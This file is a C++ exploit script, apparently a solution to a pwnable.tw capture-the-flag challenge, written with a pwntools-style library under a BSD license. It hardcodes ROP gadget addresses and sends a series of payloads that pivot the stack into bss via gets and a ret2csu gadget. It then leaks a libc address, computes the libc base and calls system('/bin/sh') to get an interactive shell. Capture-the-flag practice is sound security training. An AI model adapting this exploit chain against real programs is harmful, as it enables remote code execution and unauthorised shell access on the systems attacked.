/*
BSD 2-Clause License

Copyright (c) 2021, libpwntools
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

#include <pwntools>
#include <vector>
#include <iostream>
#include <string>
#include <stdint.h>

Remote io("chall.pwnable.tw",10402);

using namespace std::string_literals;

// Gadgets
uint32_t bss = 0x601000;
uint32_t pop_rdi = 0x004005c3;
uint32_t pop_rsi = 0x004005c1;
uint32_t pop_rsp = 0x004005bd;
uint32_t pop_2345 = 0x004005bc;
uint32_t csu_gad = 0x04005ba;
uint32_t call_gad = 0x04005a0;
uint32_t leave_ret = 0x00400554;
uint32_t pop_rbp = 0x004004a0;
uint32_t stdin_ptr = 0x6010e8;
uint32_t gets_offset = 0x6ed80;
uint32_t gets_ = 0x400430;
uint32_t difference = 0x353958;
uint32_t gets_got = 0x600ff0;
uint32_t binsh = 0x18c177;
uint32_t system_ = 0x45390;

int main() {
    using namespace neolib;
    using namespace pack;

    std::string s;
    s.resize(0x10);
    std::string Payload1, Payload2, Payload3, Payload4, Payload5;
    Payload1 = s + p64(bss) + p64(pop_rdi)+p64(bss+0x100)+p64(gets_)+p64(pop_rsp)+p64(bss+0x100);
    io.sendline(Payload1);

    Payload2.resize(0x18);
    Payload2 += p64(pop_rdi)+p64(bss+0xc8)+p64(gets_)+p64(pop_rdi)+p64(bss+0x400)+p64(gets_)+p64(pop_rsp)+p64(bss+0x400);
    io.sendline(Payload2);

    io.sendline("AAAAAAAA");
    Payload3.resize(0x18);
    Payload3 += p64(pop_rdi)+p64(bss+0x110)+p64(gets_)+p64(pop_rdi)+p64(bss+0x130);
    Payload3 += p64(gets_)+p64(pop_rdi)+p64(bss+0x500)+p64(gets_)+p64(pop_rbp)+p64(bss+0x108)+p64(leave_ret);

    io.sendline(Payload3);

    Payload4 = p64(csu_gad) + p64(difference>>3) + p64(0x6a72c);
    io.sendline(Payload4);

    Payload5 = p64(0x100)+p64(gets_got)+p64(bss+0x500)+p64(call_gad);
    std::string junk;
    junk.resize(7 * 8);
    Payload5 += junk+p64(pop_rdi)+p64(bss+0x600);
    Payload5 += p64(gets_)+p64(pop_rbp)+p64(bss+0x5f8)+p64(leave_ret);
    io.sendline(Payload5);
    std::string fake;
    printf("0x%ld\n",sizeof(FILE));
    fake.resize(sizeof(FILE));
    io.sendline(fake);
    std::string leak_string = io.recv(0x6);
    leak_string.resize(0x8);
    uint64_t libc_base = u64(leak_string) - gets_offset;
    printf("Libc leak: %p\n",(void *)libc_base);
    std::string Final_Payload = p64(pop_rdi)+p64(libc_base+binsh)+p64(libc_base+system_);
    io.sendline(Final_Payload);
    io.interactive();
}
